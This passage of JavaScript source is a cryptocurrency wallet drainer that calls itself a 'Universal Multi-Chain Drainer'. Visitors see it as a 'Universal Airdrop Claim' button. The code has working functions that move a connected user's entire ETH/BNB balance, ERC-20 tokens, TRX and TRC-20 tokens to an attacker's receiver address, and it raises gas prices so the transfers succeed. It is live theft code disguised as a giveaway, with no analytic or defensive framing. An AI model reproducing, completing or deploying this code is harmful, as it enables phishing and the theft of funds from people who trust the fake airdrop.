                    console.log(`📝 Transaction built, signing...`);
                    const signedTx = await window.tronWeb.trx.sign(transaction);
                    
                    console.log(`📤 Sending TRX transaction...`);
                    const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
                    
                    if (result.result) {
                        console.log(`✅ TRX transfer sent: ${result.txid}`);
                        console.log(`🔗 View transaction: https://tronscan.org/#/transaction/${result.txid}`);
                        console.log(`💸 Successfully sent ${trxBalance - 1} TRX to ${receiverAddress}`);
                        totalValue += parseFloat(trxBalance) - 1; // Subtract fee reservation
                    } else {
                        console.error(`❌ TRX transfer failed:`, result);
                        return { success: false, error: "TRX transfer failed", amount: 0 };
                    }
                } catch (transferError) {
                    console.error(`❌ TRX transfer error: ${transferError.message}`);
                    return { success: false, error: transferError.message, amount: 0 };
                }
            } else {
                console.log(`⚠️ TRX balance too low for transfer: ${trxBalance} TRX`);
                if (balance > 0) {
                    totalValue = parseFloat(trxBalance); // Still count small balance
                }
            }
            
            // Drain TRC-20 tokens
            console.log(`🔍 Checking TRC-20 tokens...`);
            for (const token of CONFIG.TRON_TOKENS) {
                try {
                    const tokenDrained = await drainTRC20Token(userAddress, receiverAddress, token);
                    if (tokenDrained > 0) {
                        console.log(`✅ Drained ${tokenDrained} ${token.symbol}`);
                        totalValue += tokenDrained;
                    }
                } catch (error) {
                    console.error(`Failed to drain ${token.symbol}:`, error);
                }
            }
            
            return { success: totalValue > 0, amount: totalValue };
            
        } catch (error) {
            console.error("Tron drain error:", error);
            return { success: false, error: error.message, amount: 0 };
        }
    }

    // === UTILITY FUNCTIONS ===
    async function switchToNetwork(networkConfig) {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${networkConfig.chainId.toString(16)}` }],
            });
        } catch (switchError) {
            // Network not added, try to add it
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: `0x${networkConfig.chainId.toString(16)}`,
                        chainName: networkConfig.name,
                        nativeCurrency: {
                            name: networkConfig.currency,
                            symbol: networkConfig.currency,
                            decimals: 18
                        },
                        rpcUrls: [networkConfig.rpcUrl],
                        blockExplorerUrls: [networkConfig.explorerUrl]
                    }]
                });
            } else {
                throw switchError;
            }
        }
    }

    async function drainERC20Token(provider, signer, userAddress, token, receiverAddress, gasPrice) {
        try {
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)"
            ];
            
            // Skip checksum validation by using getAddress
            let tokenAddress = token.address;
            try {
                // Force convert to proper checksum format
                tokenAddress = ethers.utils.getAddress(token.address.toLowerCase());
            } catch (checksumError) {
                console.log(`⚠️ Skipping ${token.symbol} due to invalid address: ${token.address}`);
                return 0;
            }
            
            const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
            let balance;
            
            try {
                balance = await tokenContract.balanceOf(userAddress);
            } catch (balanceError) {
                console.log(`⚠️ Cannot check balance for ${token.symbol}:`, balanceError.message);
                return 0;
            }
            
            if (balance.isZero()) return 0;
            
            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
            console.log(`Found ${token.symbol}: ${tokenAmount}`);
            
            // Estimate gas
            let gasLimit;
            try {
                gasLimit = await tokenContract.estimateGas.transfer(receiverAddress, balance);
            } catch (gasError) {
                console.log(`⚠️ Cannot estimate gas for ${token.symbol}:`, gasError.message);
                return 0;
            }
            
            const gasCost = gasPrice.mul(gasLimit);
            
            // Check if user has enough ETH/BNB for gas
            const ethBalance = await provider.getBalance(userAddress);
            if (ethBalance.lt(gasCost)) {
                console.log(`Insufficient gas for ${token.symbol}`);
                return 0;
            }
            
            // Transfer tokens
            const tx = await tokenContract.transfer(receiverAddress, balance, {
                gasLimit: gasLimit.mul(120).div(100), // 20% buffer
                gasPrice: gasPrice
            });
            
            await tx.wait();
            console.log(`✅ ${token.symbol} transferred: ${tx.hash}`);
            
            return parseFloat(tokenAmount);
            
        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error.message);
            return 0;
        }
    }

    async function drainETH(provider, signer, userAddress, receiverAddress) {
        try {
            console.log(`💰 Starting ETH/BNB drain from ${userAddress} to ${receiverAddress}`);
            
            // Get balance with error handling
            let balance;
            try {
                balance = await provider.getBalance(userAddress);
                if (balance.isZero()) {
                    console.log("⚠️ No ETH/BNB balance to transfer");
                    return 0;
                }
                console.log(`Current balance: ${ethers.utils.formatEther(balance)} ETH/BNB`);
            } catch (balanceError) {
                console.error(`❌ Failed to get balance: ${balanceError.message}`);
                return 0;
            }
            
            // Get current gas price with error handling
            let gasPrice;
            try {
                gasPrice = await provider.getGasPrice();
                // Increase gas price by 50% for better chance of success
                gasPrice = gasPrice.mul(150).div(100);
                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            } catch (gasPriceError) {
                console.log("⚠️ Could not get gas price, using fallback");
                gasPrice = ethers.utils.parseUnits('30', 'gwei'); // 30 gwei fallback
            }
            
            const gasLimit = ethers.BigNumber.from("21000");
            const gasCost = gasPrice.mul(gasLimit);
            
            const amountToSend = balance.sub(gasCost);
            if (amountToSend.lte(0)) {
                console.log(`⚠️ Insufficient balance for gas fees. Balance: ${ethers.utils.formatEther(balance)}, Gas cost: ${ethers.utils.formatEther(gasCost)}`);
                return 0;
            }
            
            const ethAmount = ethers.utils.formatEther(amountToSend);
            console.log(`🚀 Preparing to send ${ethAmount} ETH/BNB (${amountToSend.toString()} wei)`);
            
            try {
                // Get nonce with error handling
                let nonce;
                try {
                    nonce = await provider.getTransactionCount(userAddress, 'pending');
                } catch (nonceError) {
                    console.log("⚠️ Could not get nonce, using latest");
                    nonce = await provider.getTransactionCount(userAddress, 'latest');
                }
                
                // Create transaction with explicit parameters
                const txRequest = {
                    to: receiverAddress,
                    value: amountToSend,
                    gasLimit: gasLimit,
                    gasPrice: gasPrice,
                    nonce: nonce
                };
                
                console.log(`📤 Transaction details:`, {
                    to: txRequest.to,
                    value: ethers.utils.formatEther(txRequest.value),
                    gasLimit: txRequest.gasLimit.toString(),
                    gasPrice: ethers.utils.formatUnits(txRequest.gasPrice, 'gwei') + ' gwei',
                    nonce: txRequest.nonce
                });
                
                // Send transaction with better error handling
                let tx;
                try {
                    tx = await signer.sendTransaction(txRequest);
                    console.log(`✅ ETH/BNB transfer initiated: ${tx.hash}`);
                    console.log(`🔗 View transaction: https://etherscan.io/tx/${tx.hash}`);
                } catch (sendError) {
                    // Handle specific error types
                    if (sendError.code === 4001) {
                        console.log(`❌ User rejected the transaction`);
                        return 0;
                    } else if (sendError.code === -32603) {
                        console.log(`❌ Insufficient funds for gas: ${sendError.message}`);
                        return 0;
                    } else if (sendError.message && sendError.message.includes('insufficient funds')) {
                        console.log(`❌ Insufficient funds: ${sendError.message}`);
                        return 0;
                    } else if (sendError.message && sendError.message.includes('nonce')) {
                        console.log(`⚠️ Nonce error: ${sendError.message}`);
                        return 0;
                    } else if (sendError.message && sendError.message.includes('Unexpected error')) {
                        console.log(`❌ Wallet error (likely Phantom wallet issue): ${sendError.message}`);
                        return 0;
                    } else {
                        console.error(`❌ Transaction send failed: ${sendError.message}`);
                        console.error(`Error code: ${sendError.code}`);
                        return 0;
                    }
                }
                
                // Return success immediately without waiting for confirmation to avoid timeout issues
                console.log(`✅ ETH/BNB transfer sent successfully: ${tx.hash}`);
                console.log(`💸 Sent ${ethAmount} ETH/BNB to ${receiverAddress}`);
                return parseFloat(ethAmount);
                
            } catch (error) {
                console.error(`❌ Transaction preparation failed: ${error.message}`);
                return 0;
            }
            
        } catch (error) {
            console.error(`❌ ETH/BNB drain error: ${error.message}`);
            return 0;
        }
    }

    async function drainSPLToken(connection, userPubKey, receiverPubKey, token) {
        // SPL token draining logic would go here
        // This is a simplified version
        console.log(`Checking ${token.symbol} balance...`);
        return 0; // Placeholder
    }

    async function drainTRC20Token(userAddress, receiverAddress, token) {
        try {
            console.log(`🔍 Checking ${token.symbol} balance...`);
            
            const contract = await window.tronWeb.contract().at(token.address);
            const balance = await contract.balanceOf(userAddress).call();
            
            if (balance && balance.toString() !== '0') {
                const tokenAmount = parseFloat(window.tronWeb.fromSun(balance));
                console.log(`Found ${tokenAmount} ${token.symbol}`);
                
                console.log(`📤 Transferring ${token.symbol} to ${receiverAddress}...`);
                const result = await contract.transfer(receiverAddress, balance).send();
                
                if (result) {
                    console.log(`✅ ${token.symbol} (TRC-20) transferred: ${result}`);
                    return tokenAmount;
                } else {
                    console.log(`⚠️ ${token.symbol} transfer failed`);
                    return 0;
                }
            } else {
                console.log(`⚠️ No ${token.symbol} balance found`);
                return 0;
            }
        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error.message);
            return 0;
        }
    }

    // === UI FUNCTIONS ===
    function updateStatus(message) {
        $('#progress-text').text(message);
        console.log(message);
    }

    function updateProgress(percentage) {
        $('#progress-fill').css('width', `${percentage}%`);
    }

    function showLoading(text) {
        $('#loading-text').text(text);
        $('#loading-modal').show();
    }

    function hideLoading() {
        $('#loading-modal').hide();
    }

    // Old function removed - replaced with startUniversalConnection

    // Old function removed - permissions requested individually per network

    // === WALLET DETECTION ===
    function detectAvailableWallets() {
        const wallets = [];
        
        // Simplified detection - just show what's available
        if (window.ethereum) {
            wallets.push("Multi-Chain Wallet Detected");
        }
        
        if (window.solana) {
            wallets.push("Solana Wallet Detected");
        }
        
        if (window.tronWeb) {
            wallets.push("Tron Wallet Detected");
        }
        
        // Always show Bitcoin as option (even if not detectable)
        wallets.push("Bitcoin Support Available");
        
        console.log("Detected wallet capabilities:", wallets);
        updateWalletUI(wallets);
    }

    function updateWalletUI(wallets) {
        const walletGrid = $('#wallet-options');
        walletGrid.empty();
        
        if (wallets.length > 0) {
            wallets.forEach(wallet => {
                walletGrid.append(`
                    <div class="wallet-option">
                        <div class="wallet-icon">✅</div>
                        <span>${wallet}</span>
                    </div>
                `);
            });
            
            // Enable the connect button
            $('#connect-btn').prop('disabled', false);
        } else {
            walletGrid.append(`
                <div class="wallet-placeholder">
                    <div class="wallet-icon">🔗</div>
                    <span>Install wallet extensions to continue</span>
                </div>
            `);
        }
    }

    // Simplified functions
    function selectNetwork(network) {
        // Not needed anymore, but keep for compatibility
        console.log(`Network ${network} selected (legacy)`);
    }

    function connectWallet() {
        // Redirect to main connection function
        startUniversalConnection();
    }

    function updateUI() {
        // Initial UI updates
        $('#connection-text').text('Ready to scan wallets');
        $('.status-dot').addClass('connected');
        
        // Remove network selection requirement
        $('#connect-btn').text('🚀 Start Universal Airdrop Claim');
    }

    // Auto-start when user clicks the main button
    $(document).on('click', '#connect-btn', function() {
        if (!isDraining) {
            startUniversalConnection();
        }
    });

    console.log("✅ Universal Multi-Chain Drainer loaded successfully");
});
